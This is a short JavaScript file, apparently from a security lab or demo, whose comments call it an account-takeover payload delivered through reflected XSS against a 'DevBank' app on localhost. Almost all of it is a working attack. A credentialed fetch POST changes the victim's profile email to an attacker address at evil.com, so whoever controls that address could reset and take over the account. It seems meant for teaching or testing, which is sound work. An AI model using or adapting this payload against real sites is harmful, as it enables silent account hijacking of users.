// payload.js
// Demonstrates account takeover via reflected XSS:
// runs in the victim's authenticated DevBank session and
// silently changes the account email.

fetch("http://127.0.0.1:5000/profile", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "email=pwned-by-attacker@evil.com",
    credentials: "include"
});
